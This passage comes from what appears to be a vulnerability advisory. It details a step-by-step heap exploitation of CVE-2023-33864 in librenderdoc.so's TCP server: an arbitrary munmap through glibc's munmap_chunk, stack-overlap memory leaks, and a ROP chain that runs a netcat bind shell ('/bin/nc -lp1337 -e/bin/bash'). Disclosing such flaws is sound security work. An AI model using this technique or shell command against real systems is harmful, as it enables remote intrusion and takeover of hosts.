creates a new thread (a "client thread"), allocates a new thread stack
(8MB+4KB of mmap()ed memory, for the stack and its guard page), and then
memory-leaks this stack (because the server does not call pthread_join()
when the client thread terminates abnormally, which prevents its stack
from being freed or reused for another client thread).

The goal of this step 2/ is simply to fill the random gap between the
heap and the libraries (with the help of a memory leak), to prevent any
future thread stack from being allocated into this gap. The reason for
doing this will become clear in step 7/.

3/ We connect to the server on TCP port 38920, send a handshake packet
that contains a 16MB client-name string (it must be longer than 10MB to
trigger CVE-2023-33864), and obtain the following layout for the
server's heap:

  0                           14M  16M      20M              28M      32M
--V-+-+-+-+--------------------V----V--------V----------------V--------V--
  |F|I|L|C|               ....
--|-+-+-+-+---------------------------------------------------------------

- F are fixed chunks of memory (at the very beginning of the heap) that
  were not allocated by us but whose sizes are known to us;

- I is the 64KB intermediary buffer mentioned in the previous section;

- L is a small chunk that was memory-leaked (or free()d but stored in an
  otherwise unused tcache) and whose size is exactly controlled by us;

- C is a small chunk (a "callstack" from our handshake packet) whose
  exact size and contents do not matter much.

4/ We overflow the intermediary buffer I (thanks to CVE-2023-33864),
overwrite L's malloc_chunk header with an unchanged size field, and
overwrite C's malloc_chunk header with arbitrary prev_size and size
fields.

5/ The server free()s the intermediary buffer I. This free() succeeds
despite our buffer overflow because we overwrote the malloc_chunk header
of I's next chunk (L) with an unchanged size; without L between I and C,
free()'s security checks would detect that we overwrote C's malloc_chunk
header with arbitrary sizes and would abort().

6/ The server free()s the small chunk C. Because we overwrote C's
malloc_chunk header with a size field whose IS_MMAPPED bit is set,
free() calls its internal function munmap_chunk():

------------------------------------------------------------------------
3018 static void
3019 munmap_chunk (mchunkptr p)
3020 {
3021   size_t pagesize = GLRO (dl_pagesize);
3022   INTERNAL_SIZE_T size = chunksize (p);
....
3026   uintptr_t mem = (uintptr_t) chunk2mem (p);
3027   uintptr_t block = (uintptr_t) p - prev_size (p);
3028   size_t total_size = prev_size (p) + size;
....
3034   if (__glibc_unlikely ((block | total_size) & (pagesize - 1)) != 0
3035       || __glibc_unlikely (!powerof2 (mem & (pagesize - 1))))
3036     malloc_printerr ("munmap_chunk(): invalid pointer");
....
3044   __munmap ((char *) block, total_size);
3045 }
------------------------------------------------------------------------

- we fully control prev_size and size (because p is a pointer to C's
  malloc_chunk header, which we overwrote), so we can munmap() an
  arbitrary block of memory (at line 3044), relative to p (i.e.,
  relative to C, and without knowing the ASLR);

- we can easily satisfy the preconditions at lines 3034 and 3035,
  because we fully control prev_size and size, and because we know the
  sizes of F and I, and we precisely control the size of L.

We exploit this arbitrary munmap() to punch a hole of exactly 8MB+4KB
(the size of a thread stack and its guard page) in the middle of the
server's heap:

  0                           14M  16M      20M              28M      32M
--V-+-+-+-+--------------------V----V--------V----------------V--------V--
  |F|I|L|C|               ....               |  punched hole  |
--|-+-+-+-+----------------------------------+----------------+-----------

Note: we cannot reuse the technique that we developed to exploit
CVE-2005-1513 (in qmail) here, because of the random gap between the
server's heap and the libraries (and our exploit here must be one-shot);
for reference:

  https://www.qualys.com/2020/05/19/cve-2005-1513/remote-code-execution-qmail.txt
  https://maxwelldulin.com/BlogPost/House-of-Muney-Heap-Exploitation
  https://www.ambionics.io/blog/hacking-watchguard-firewalls

7/ We connect to the server on TCP port 38920; the server creates a new
client thread, and allocates a new stack for this thread, exactly into
the hole that we punched in the server's heap (since step 2/ such a
stack cannot be allocated anymore into the random gap between the
server's heap and the libraries):

  0                           14M  16M      20M              28M      32M
--V-+-+-+-+--------------------V----V--------V----------------V--------V--
  |F|I|L|C|               ....               |  client stack  |
--|-+-+-+-+----------------------------------+----------------+-----------

We then disconnect from the server; the client thread terminates cleanly
and the server pthread_join()s with it, thus making its stack available
for a future client thread.

8/ We establish a long-lived connection to the server, and send a 14MB
client-name string (but we do not trigger CVE-2023-33864 this time); the
server reads our client name into a malloc()ated string buffer that ends
in the middle of the unused client stack (i.e., this client name and the
client stack overlap in the server's heap):

  0                           14M  16M      20M              28M      32M
--V-+-+-+-+--------------------V----V--------V----------------V--------V--
  |F|I|L|C|        ....        |             |  client stack  |
--|-+-+-+-+--------------------+-------------+-------------+--+-----------
                               |---------------------------|
                                        client name

Note: although the client stack's guard page is initially mmap()ed
PROT_NONE, it is conveniently mprotect()ed read-write by the glibc's
malloc when extending the server's heap for our 14MB client name (in
grow_heap())!

The server then creates a new client thread for our long-lived
connection, and reuses the existing client stack for this thread, thus
overwriting the end of our client name with data from the client stack.

9/ We establish another connection to the server; however, because our
first connection is still alive, the server disconnects us, but first
gives us the name of the client that is already connected (i.e., the
server sends us back our 14MB client name, which was partly overwritten
by data from the client stack), thus information-leaking all sorts of
stack contents to us: heap addresses, library addresses, stack
addresses, the stack canary, etc.

10/ While our first connection to the server is still alive, we
establish another connection and start sending a 9MB string; the server
reads this string into a malloc()ated buffer that starts in the middle
of the client stack (immediately after the 14MB client name), thus
overwriting the client stack with data that we fully control (a ROP
chain):

  0                           14M  16M      20M              28M      32M
--V-+-+-+-+--------------------V----V--------V----------------V--------V--
  |F|I|L|C|        ....        |             |  client stack  |
--|-+-+-+-+--------------------+-------------+-------------+--+-----------
                               |---------------------------|--->
                                        client name         ROP

As soon as the client thread returns to a saved instruction pointer
(RIP) from the overwritten part of the client stack, our ROP chain is
executed: first a "ROP sled" (a series of minimal "ret" gadgets, because
we do not know the exact distance between the start of our ROP chain and
the first overwritten saved RIP in the client stack), followed by a
simple execve() of "/bin/nc -lp1337 -e/bin/bash".

Note: we build our ROP chain with gadgets from librenderdoc.so only
(whose address was information-leaked to us in step 9/), to avoid any
dependence on the application being debugged or its shared libraries.

To summarize this reliable, one-shot technique that we used to exploit
the heap-based buffer overflow in librenderdoc.so's multi-threaded TCP
server:

- we overwrite the malloc_chunk header of a heap-based buffer (which
  will be free()d) with an arbitrary size field whose IS_MMAPPED bit is
  set, and therefore transform this buffer overflow into an arbitrary
  munmap() call (thanks to free()'s munmap_chunk() function);

- with this arbitrary munmap() call, we punch a hole of exactly 8MB+4KB
  (the size of a thread stack) in the middle of the server's heap;

- we arrange for a thread stack to be mmap()ed into this hole, and for a
  string (which will later be sent to us by the server) to be
  malloc()ated over the lower part of this thread stack;

- when this string is sent to us by the server, parts of it were
  overwritten by data from the thread stack, thus information-leaking
  all sorts of stack contents to us (heap addresses, library addresses,
  stack addresses, the stack canary, etc);

- finally, we arrange for another string (which we fully control) to be
  malloc()ated over the higher part of the thread stack, and therefore
  overwrite a saved instruction pointer (in the thread stack) with a ROP
  chain of gadgets from librenderdoc.so (whose address was previously
  information-leaked to us) -- a classic "stack smashing" attack.

Note: further possibilities for munmap_chunk() exploitation are explored
in http://tukan.farm/2016/07/27/munmap-madness/.

```